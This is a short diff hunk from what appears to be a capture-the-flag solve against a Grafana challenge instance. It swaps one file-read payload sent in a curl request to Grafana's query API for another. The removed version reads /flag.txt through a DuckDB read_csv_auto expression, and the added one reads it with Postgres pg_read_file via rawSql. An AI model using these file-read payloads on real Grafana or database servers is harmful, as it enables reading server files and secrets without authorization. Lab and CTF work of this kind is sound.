@@ -320,11 +320,10 @@ curl -X POST "https://dalctf-grafana-jitsu-39-64616c.instancer.dalctf2026.com/ap
     {
       "refId": "A",
       "datasource": {
-        "uid": "__expr__",
-        "type": "__expr__"
+        "uid": "PA478B4566BE5CB00"
       },
-      "type": "sql",
-      "expression": "SELECT * FROM read_csv_auto('\''/flag.txt'\'', header=false)"
+      "rawSql": "SELECT pg_read_file('\''/flag.txt'\'');",
+      "format": "table"
     }
   ],
   "from": "now-1h",
